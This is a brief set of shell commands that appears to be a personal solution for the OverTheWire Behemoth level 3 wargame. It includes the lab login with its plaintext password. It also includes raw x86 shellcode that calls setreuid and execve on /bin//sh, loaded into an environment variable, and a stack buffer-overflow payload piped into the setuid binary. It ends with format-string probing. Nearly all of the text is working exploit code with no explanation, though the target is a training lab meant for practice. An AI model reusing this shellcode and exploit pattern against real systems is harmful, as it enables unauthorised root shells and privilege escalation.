sftp -oPort=2221 behemoth3@narnia.labs.overthewire.org
JQ6tZGqt0i
get /behemoth/behemoth3
exit

sshpass -p 'JQ6tZGqt0i' ssh behemoth3@narnia.labs.overthewire.org -p 2221

cd /behemoth/
export PYTHONIOENCODING=latin-1
export EGG=$(python3 -c "print('\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80')")

(python3 -c "print('a' * 71 + '\x4a\xca\xff\xff')";cat) | /behemoth/behemoth3


./behemoth3 <<< %p/%p/%p/%p
./behemoth3 <<< $(python3 -c "import sys; sys.stdout.buffer.write(b'%p,'*10)")